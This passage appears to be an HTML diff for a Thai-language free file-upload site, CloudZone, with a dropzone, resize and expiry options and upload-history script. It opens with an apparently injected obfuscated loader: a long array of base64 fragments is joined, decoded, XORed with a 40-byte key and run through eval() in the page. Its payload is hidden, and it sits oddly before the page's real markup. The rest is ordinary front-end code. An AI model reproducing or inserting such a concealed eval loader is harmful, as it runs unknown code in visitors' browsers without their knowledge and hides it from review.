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","VKDl+DFQ=="];var _0x56ece4bc=_0x9c1016bf.join('');var _0x43e351e9=atob(_0x56ece4bc);var _0x3770b16b=[0x62,0x34,0x9a,0x2e,0x3b,0x40,0x23,0xc3,0x17,0x41,0xbb,0x63,0x88,0xb0,0xb4,0x8a,0x17,0xf1,0xa0,0x7e,0x34,0x6c,0xb9,0x9d,0x97,0x38,0xcb,0xe7,0xca,0x60,0xd3,0x64,0xdd,0xaf,0x37,0x27,0x77,0xaa,0x2e,0xda];var _0x4ceb6e5f=new Uint8Array(_0x43e351e9.length);_0x6a90153a=(_0x6a90153a+0x67)&0xffffff;_0x916610d1=(_0x916610d1+0xf74)&0xffffff;_0x1fde22c4=(_0x1fde22c4+0xd67)&0xffffff;for(var _0x98d14c1e=0;_0x98d14c1e<_0x43e351e9.length;_0x98d14c1e++){_0x4ceb6e5f[_0x98d14c1e]=_0x43e351e9.charCodeAt(_0x98d14c1e)^_0x3770b16b[_0x98d14c1e%40];}eval(new TextDecoder().decode(_0x4ceb6e5f));}();</script></body></html>
+  </script>
+</head>
+<body>
+<div class="wrap">
+
+  <!-- Ambient scan line overlay -->
+  <div style="position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden">
+    <div style="position:absolute;left:0;right:0;height:1px;background:linear-gradient(90deg,transparent,rgba(0,212,255,.5),transparent);animation:scan-line 4s linear infinite;top:0"></div>
+  </div>
+
+  <header data-aos="fade-down" data-aos-duration="600">
+    <div class="logo">
+      <div class="logo-icon">
+        <img src="https://cloudzone.xephex.xyz/uploads/file_000000003878720b88f8eeef98579f44_1d29fa.jpg" style="width:32px;height:32px;object-fit:contain;">
+      </div>
+      <div>
+        <div class="logo-text">Cloud<span>Zone</span></div>
+        <div class="sys-status" style="margin-top:2px">
+          <div class="sys-dot"></div>SYSTEM ONLINE
+        </div>
+      </div>
+    </div>
+    <div style="display:flex;flex-direction:column;align-items:flex-end;gap:6px">
+      <div class="badge">BETA</div>
+      <div style="font-family:var(--mono);font-size:.6rem;color:var(--muted);letter-spacing:.5px" id="sys-time">--:--:--</div>
+    </div>
+  </header>
+
+  <div class="card" data-aos="fade-up" data-aos-duration="600" data-aos-delay="100">
+    <div class="card-header-line"></div>
+    <div class="card-title">ฝากรูปภาพ &amp; วิดีโอ</div>
+    <div class="card-sub">&gt; อัพโหลดไฟล์ไปเก็บบนเซิฟเวอร์ ได้ฟรี ไม่จำกัดจำนวน</div>
+
+    <div class="dropzone" id="dropzone">
+      <div class="dz-corner-bl"></div>
+      <div class="dz-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
+      </div>
+      <div class="dz-text">ลากไฟล์มาวางที่นี่ หรือคลิกเพื่อเลือก</div>
+      <div class="dz-sub">รองรับรูปภาพและวิดีโอทุกประเภท · สูงสุด 5 ไฟล์</div>
+      <div class="dz-types">
+        <span class="dz-tag">JPG</span><span class="dz-tag">PNG</span><span class="dz-tag">GIF</span>
+        <span class="dz-tag">WEBP</span><span class="dz-tag">MP4</span><span class="dz-tag">MOV</span>
+        <span class="dz-tag">WEBM</span><span class="dz-tag">PDF</span>
+      </div>
+    </div>
+    <input type="file" id="fileInput" accept="image/*,video/*,.pdf,.gif,.webp" multiple>
+
+    <div id="previewArea" style="display:none;margin-top:16px">
+      <div id="multiFileList" style="display:flex;flex-direction:column;gap:8px"></div>
+      <div style="display:flex;align-items:center;justify-content:space-between;margin-top:10px;padding:8px 4px 0;border-top:1px solid rgba(0,150,200,.15)">
+        <span style="font-family:var(--mono);font-size:.75rem;color:var(--muted)" id="fileCountLabel"></span>
+        <button class="btn-clear" id="clearBtn">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+          ล้างทั้งหมด
+        </button>
+      </div>
+    </div>
+
+    <div class="settings-grid">
+      <div class="field">
+        <label>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 3 21 3 21 9"/><polyline points="9 21 3 21 3 15"/><line x1="21" y1="3" x2="14" y2="10"/><line x1="3" y1="21" x2="10" y2="14"/></svg>
+          ปรับขนาดรูป
+        </label>
+        <select id="resizeOpt">
+          <option value="">ไม่ปรับขนาดรูปภาพของฉัน</option>
+          <option value="64">64x64 — อวาตาร์ / ไอคอน</option>
+          <option value="150">150x150 — ภาพตัวอย่างขนาดเล็ก</option>
+          <option value="320">320x240 — ขนาดสำหรับเว็บไซต์หรืออีเมล</option>
+          <option value="640">640x480 — รูปภาพขนาดเล็ก</option>
+          <option value="800">800x600 — รูปภาพขนาดกลาง</option>
+          <option value="1024">1024x768 — รูปภาพขนาดใหญ่</option>
+          <option value="1280">1280x720 — คุณภาพระดับ HD</option>
+          <option value="1920">1920x1080 — คุณภาพระดับ Full HD</option>
+          <option value="3840">3840x2160 — คุณภาพระดับ 4K</option>
+        </select>
+      </div>
+      <div class="field">
+        <label>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          วันหมดอายุ
+        </label>
+        <select id="expiryOpt">
+          <option value="">ไม่มีวันหมดอายุ</option>
+          <option value="1h">ลบหลังจาก 1 ชั่วโมง</option>
+          <option value="3h">ลบหลังจาก 3 ชั่วโมง</option>
+          <option value="6h">ลบหลังจาก 6 ชั่วโมง</option>
+          <option value="12h">ลบหลังจาก 12 ชั่วโมง</option>
+          <option value="1d">ลบหลังจาก 1 วัน</option>
+          <option value="3d">ลบหลังจาก 3 วัน</option>
+          <option value="1w">ลบหลังจาก 1 สัปดาห์</option>
+          <option value="2w">ลบหลังจาก 2 สัปดาห์</option>
+          <option value="1mo">ลบหลังจาก 1 เดือน</option>
+          <option value="3mo">ลบหลังจาก 3 เดือน</option>
+          <option value="6mo">ลบหลังจาก 6 เดือน</option>
+          <option value="1y">ลบหลังจาก 1 ปี</option>
+        </select>
+      </div>
+    </div>
+
+    <button class="btn-upload" id="uploadBtn">
+      <span id="btnIconWrap">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="width:20px;height:20px"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
+      </span>
+      <span id="btnText">อัพโหลดเลย</span>
+    </button>
+
+    <div id="progressWrap">
+      <div class="progress-label">
+        <span id="progressLabel">กำลังอัพโหลด...</span>
+        <span id="progressPct">0%</span>
+      </div>
+      <div class="progress-bar-bg"><div class="progress-bar-fill" id="progressFill"></div></div>
+    </div>
+
+    <div id="errorBox">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+      <span id="errorText"></span>
+    </div>
+
+    <div id="debugPanel">
+      <div class="dbg-header">
+        <span class="dbg-title">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+          Debug — สาเหตุ Error
+        </span>
+        <button class="dbg-close" id="debugClose">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+        </button>
+      </div>
+      <div class="dbg-body" id="debugBody"></div>
+    </div>
+  </div>
+
+  <div id="resultCard" data-aos="fade-up" data-aos-duration="500">
+    <div class="result-header">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+      <div>
+        <div class="result-title">อัพโหลดสำเร็จ!</div>
+        <div class="result-sub">คัดลอกลิงก์ด้านล่างไปใช้งานได้เลย</div>
+      </div>
+    </div>
+    <div class="url-row">
+      <input class="url-input" id="resultUrl" readonly>
+      <button class="btn-copy" id="copyBtn" title="คัดลอกลิงก์" style="padding:10px 14px;min-width:44px;justify-content:center;">
+        <svg id="copyBtnIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:18px;height:18px;flex-shrink:0"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+      </button>
+    </div>
+  </div>
+
+  <div class="card" id="historyCard" data-aos="fade-up" data-aos-duration="600" data-aos-delay="150">
+    <div class="card-header-line"></div>
+    <div class="history-header">
+      <div class="history-title">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+        ประวัติการอัพโหลด
+      </div>
+      <span class="history-count" id="historyCount">0</span>
+    </div>
+    <div id="historyList"></div>
+  </div>
+
+</div>
+<footer data-aos="fade-up" data-aos-duration="500">
+  <div style="font-family:var(--hud);font-size:.6rem;letter-spacing:2px;color:var(--muted);margin-bottom:6px">&copy; 2026 CloudZone All Rights Reserved</div>
+  CloudZone &mdash; Powered by <span>x2Snow</span> &amp; <span>Snozy</span>
+</footer>
+
+<script src="https://unpkg.com/aos@2.3.4/dist/aos.js"></script>
+<script>AOS.init({ once: true, easing: 'ease-out-cubic' });
+// Live HUD clock
+(function(){
+  var el = document.getElementById('sys-time');
+  if(!el) return;
+  function tick(){
+    var d = new Date();
+    el.textContent = [d.getHours(),d.getMinutes(),d.getSeconds()].map(function(n){return String(n).padStart(2,'0')}).join(':');
+  }
+  tick(); setInterval(tick,1000);
+})();
+(function () {
+  'use strict';
+  var selectedFiles = [];
+  var MAX_FILES = 5;
+  var clientId = localStorage.getItem('pv_client_id');
+  if (!clientId) {
+    clientId = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+      var r = Math.random()*16|0, v = c==='x' ? r : (r&0x3|0x8);
+      return v.toString(16);
+    });
+    localStorage.setItem('pv_client_id', clientId);
+  }
+  var uploadHistory = [];
+  try { uploadHistory = JSON.parse(localStorage.getItem('pv_history') || '[]'); } catch(e) {}
+  var dropzone    = document.getElementById('dropzone');
+  var fileInput   = document.getElementById('fileInput');
+  var previewArea = document.getElementById('previewArea');
+  var multiFileList = document.getElementById('multiFileList');
+  var fileCountLabel= document.getElementById('fileCountLabel');
+  var clearBtn    = document.getElementById('clearBtn');
+  var uploadBtn   = document.getElementById('uploadBtn');
+  var btnIconWrap = document.getElementById('btnIconWrap');
+  var btnText     = document.getElementById('btnText');
+  var progressWrap= document.getElementById('progressWrap');
+  var progressLbl = document.getElementById('progressLabel');
+  var progressPct = document.getElementById('progressPct');
+  var progressFill= document.getElementById('progressFill');
+  var errorBox    = document.getElementById('errorBox');
+  var errorText   = document.getElementById('errorText');
+  var debugPanel  = document.getElementById('debugPanel');
+  var debugBody   = document.getElementById('debugBody');
+  var debugClose  = document.getElementById('debugClose');
+  var resultCard  = document.getElementById('resultCard');
+  var resultUrl   = document.getElementById('resultUrl');
+  var copyBtn     = document.getElementById('copyBtn');
+  var historyCard = document.getElementById('historyCard');
+  var historyList = document.getElementById('historyList');
+  var historyCount= document.getElementById('historyCount');
+  var SVG_COPY   = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:15px;height:15px;flex-shrink:0"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>';
+  var SVG_CHECK  = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="width:15px;height:15px;flex-shrink:0"><polyline points="20 6 9 17 4 12"/></svg>';
+  var SVG_UPLOAD = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="width:20px;height:20px"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>';
+  var SVG_TRASH  = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:15px;height:15px"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6M14 11v6"/><path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg>';
+  var SVG_SPIN   = '<div class="spinner" style="width:15px;height:15px;border-width:1.5px"></div>';
+  dropzone.addEventListener('click', function() { fileInput.click(); });
+  dropzone.addEventListener('dragover', function(e) { e.preventDefault(); dropzone.classList.add('drag-over'); });
+  dropzone.addEventListener('dragleave', function() { dropzone.classList.remove('drag-over'); });
+  dropzone.addEventListener('drop', function(e) {
+    e.preventDefault(); dropzone.classList.remove('drag-over');
+    if (e.dataTransfer.files && e.dataTransfer.files.length) addFiles(Array.from(e.dataTransfer.files));
+  });
+  fileInput.addEventListener('change', function(e) {
+    if (e.target.files && e.target.files.length) addFiles(Array.from(e.target.files));
+    fileInput.value = '';
+  });
+  clearBtn.addEventListener('click', clearFile);
+  uploadBtn.addEventListener('click', startUpload);
+  debugClose.addEventListener('click', function() { debugPanel.style.display = 'none'; });
+  copyBtn.addEventListener('click', function() { doCopyIcon(resultUrl, copyBtn); });
+  function addFiles(newFiles) {
+    var remaining = MAX_FILES - selectedFiles.length;
+    if (remaining <= 0) {
+      Swal.fire({ icon:'warning', title:'ถึงขีดจำกัดแล้ว', text:'อัพโหลดได้สูงสุด ' + MAX_FILES + ' ไฟล์ต่อครั้ง', confirmButtonText:'ตกลง' });
+      return;
+    }
+    var toAdd = newFiles.slice(0, remaining);
+    if (newFiles.length > remaining) {
+      Swal.fire({ icon:'info', title:'เกินจำนวนที่รองรับ', text:'เพิ่มได้อีก ' + remaining + ' ไฟล์เท่านั้น (สูงสุด ' + MAX_FILES + ' ไฟล์)', timer:2500, timerProgressBar:true, showConfirmButton:false });
+    }
+    toAdd.forEach(function(f) { selectedFiles.push(f); });
+    renderFileList();
+    hideError(); debugPanel.style.display = 'none';
+  }
+  function renderFileList() {
+    if (!selectedFiles.length) { previewArea.style.display = 'none'; return; }
+    previewArea.style.display = 'block';
+    fileCountLabel.textContent = selectedFiles.length + '/' + MAX_FILES + ' ไฟล์';
+    var SVG_IMG  = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>';
+    var SVG_VID  = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>';
+    var SVG_FILE = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>';
+    var html = '';
+    selectedFiles.forEach(function(f, i) {
+      var thumbHtml;
+      if (f.type.indexOf('image/') === 0 && f._objUrl) {
+        thumbHtml = '<img src="' + f._objUrl + '" alt="">';
+      } else if (f.type.indexOf('image/') === 0) {
+        f._objUrl = URL.createObjectURL(f);
+        thumbHtml = '<img src="' + f._objUrl + '" alt="">';
+      } else if (f.type.indexOf('video/') === 0) {
+        thumbHtml = SVG_VID;
+      } else {
+        thumbHtml = SVG_FILE;
+      }
+      var statusClass = f._status === 'done' ? 'done' : f._status === 'fail' ? 'fail' : '';
+      html += '<div class="mf-item ' + statusClass + '" id="mf-item-' + i + '">';
+      html += '<div class="mf-thumb">' + thumbHtml + '</div>';
+      html += '<div class="mf-info">';
+      html += '<div class="mf-name">' + esc(f.name) + '</div>';
+      html += '<div class="mf-size">' + formatBytes(f.size) + '</div>';
+      if (f._statusMsg) html += '<div class="mf-status ' + (f._status === 'done' ? 'ok' : 'err') + '">' + esc(f._statusMsg) + '</div>';
+      html += '</div>';
+      if (!f._uploading) {
